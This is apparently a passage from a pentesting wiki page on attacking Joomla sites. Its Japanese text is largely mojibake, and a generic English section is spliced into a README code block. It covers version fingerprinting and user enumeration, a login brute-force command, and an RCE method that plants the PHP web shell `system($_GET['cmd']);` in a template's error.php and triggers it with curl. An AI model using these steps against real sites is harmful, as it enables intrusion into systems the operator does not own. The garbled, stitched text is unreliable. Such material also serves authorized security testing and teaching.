# Joomla

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹**ã—ãŸã„ã§ã™ã‹ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[NFTs](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„
* [**å…¬å¼PEASSï¼†HackTricks swag**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* **[ğŸ’¬](https://emojipedia.org/speech-balloon/) [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã«å‚åŠ ã™ã‚‹ã‹ã€[telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§**ğŸ¦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

### Joomlaã®çµ±è¨ˆ

Joomlaã¯ã€Joomlaã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹Joomlaã€PHPã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã€ãŠã‚ˆã³ã‚µãƒ¼ãƒãƒ¼ã®ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã®åˆ†æãªã©ã€ã„ãã¤ã‹ã®åŒ¿åã®[ä½¿ç”¨çµ±è¨ˆ](https://developer.joomla.org/about/stats.html)ã‚’åé›†ã—ã¦ã„ã¾ã™ã€‚ã“ã®ãƒ‡ãƒ¼ã‚¿ã¯ã€å½¼ã‚‰ã®å…¬é–‹[API](https://developer.joomla.org/about/stats/api.html)ã‚’ä»‹ã—ã¦ã‚¯ã‚¨ãƒªã§ãã¾ã™ã€‚
```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool

{
"data": {
"cms_version": {
"3.0": 0,
"3.1": 0,
"3.10": 6.33,
"3.2": 0.01,
"3.3": 0.02,
"3.4": 0.05,
"3.5": 12.24,
"3.6": 22.85,
"3.7": 7.99,
"3.8": 17.72,
"3.9": 27.24,
"4.0": 3.21,
"4.1": 1.53,
"4.2": 0.82,
"4.3": 0,
"5.0": 0
},
"total": 2951032
}
}
```
## åˆ—æŒ™

### ç™ºè¦‹/ãƒ•ãƒƒãƒˆãƒ—ãƒªãƒ³ãƒ†ã‚£ãƒ³ã‚°

* **meta**ã‚’ãƒã‚§ãƒƒã‚¯
```bash
curl https://www.joomla.org/ | grep Joomla | grep generator

<meta name="generator" content="Joomla! - Open Source Content Management" />
```
* robots.txt
```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
[...]
```
* README.txt

## Joomla

### Information Gathering

#### Version Detection

JoomScan is a tool used to detect the version of Joomla running on the target web server. It can be used to identify potential vulnerabilities associated with the detected version.

```bash
./joomscan.pl -u <target_url>
```

### Enumeration

#### User Enumeration

Joomraider is a tool that can be used to enumerate users in Joomla. It can help identify valid usernames that can be used in further attacks.

```bash
python joomraider.py -u <target_url>
```

### Exploitation

#### Known Vulnerabilities

Exploit Database and other sources can be used to find known vulnerabilities in the detected Joomla version. These vulnerabilities can be exploited to gain unauthorized access to the Joomla application.

### Post-Exploitation

#### Privilege Escalation

Once access to the Joomla application is gained, privilege escalation techniques can be used to elevate privileges and gain further control over the application and the underlying server.

### Conclusion

Joomla websites can be vulnerable to various attacks if not properly secured. It is important to regularly update the Joomla installation and follow security best practices to prevent unauthorized access and data breaches.
```
1- What is this?
* This is a Joomla! installation/upgrade package to version 3.x
* Joomla! Official site: https://www.joomla.org
* Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging
```
### ãƒãƒ¼ã‚¸ãƒ§ãƒ³

* **/administrator/manifests/files/joomla.xml** ã§ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ç¢ºèªã§ãã¾ã™ã€‚
* **/language/en-GB/en-GB.xml** ã§Joomlaã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å–å¾—ã§ãã¾ã™ã€‚
* **plugins/system/cache/cache.xml** ã§ã¯ãŠãŠã‚ˆãã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ãŒç¢ºèªã§ãã¾ã™ã€‚
```bash
droopescan scan joomla --url http://joomla-site.local/
```
### Brute-Force

[ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆ](https://github.com/ajnik/joomla-bruteforce)ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ­ã‚°ã‚¤ãƒ³ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã—ã‚ˆã†ã€‚
```shell-session
sudo python3 joomla-brute.py -u http://joomla-site.local/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

admin:admin
```
## RCE

**ç®¡ç†è€…è³‡æ ¼æƒ…å ±**ã‚’å–å¾—ã—ãŸå ´åˆã€**PHPã‚³ãƒ¼ãƒ‰ã®ã‚¹ãƒ‹ãƒšãƒƒãƒˆ**ã‚’è¿½åŠ ã—ã¦**RCE**ã‚’ç²å¾—ã§ãã¾ã™ã€‚ã“ã‚Œã¯**ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ**ã‚’**ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚º**ã™ã‚‹ã“ã¨ã§è¡Œã„ã¾ã™ã€‚

1. `Configuration`ã®ä¸‹ã«ã‚ã‚‹**`Templates`**ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¦ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆãƒ¡ãƒ‹ãƒ¥ãƒ¼ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚
2. `Template`åˆ—ãƒ˜ãƒƒãƒ€ãƒ¼ã®ä¸‹ã«ã‚ã‚‹**`protostar`**ã‚’é¸æŠã—ã¦ã€**`Templates: Customise`**ãƒšãƒ¼ã‚¸ã«ç§»å‹•ã—ã¾ã™ã€‚
3. æœ€å¾Œã«ã€**ãƒšãƒ¼ã‚¸ã‚½ãƒ¼ã‚¹**ã‚’è¡¨ç¤ºã™ã‚‹ãŸã‚ã«ãƒšãƒ¼ã‚¸ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ã€‚**`error.php`**ãƒšãƒ¼ã‚¸ã‚’é¸æŠã—ã€ä»¥ä¸‹ã®ã‚ˆã†ã«**PHPã®ãƒ¯ãƒ³ãƒ©ã‚¤ãƒŠãƒ¼ã‚’è¿½åŠ **ã—ã¦ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œã‚’è¡Œã„ã¾ã™:
   - **`system($_GET['cmd']);`**
4. **ä¿å­˜ã—ã¦é–‰ã˜ã‚‹**
5. `curl -s http://joomla-site.local/templates/protostar/error.php?cmd=id`
